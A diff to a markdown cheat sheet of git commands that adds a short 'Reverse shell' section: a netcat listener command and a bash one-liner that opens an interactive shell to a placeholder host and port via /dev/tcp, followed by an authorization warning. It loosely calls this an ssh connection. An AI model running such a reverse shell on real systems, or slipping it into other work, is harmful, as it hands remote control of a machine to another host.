@@ -97,3 +97,20 @@ git remote set-url origin git@github.com:Username/repository-name.git
 
 # Inspect remotes again
 ```
+
+## Reverse shell 
+
+Listener (the machine that wants to establish the ssh connection)
+```bash
+nc -lvnp <port>
+```
+
+From the target machine run one of the commands based on the use case.
+
+1. Terminal
+```bash
+/bin/bash -i >& /dev/tcp/<ip/hostname>/<port> 0>&1
+```
+
+> [!WARNING]
+> Use reverse shell only on systems that you have explicit authorization to access.
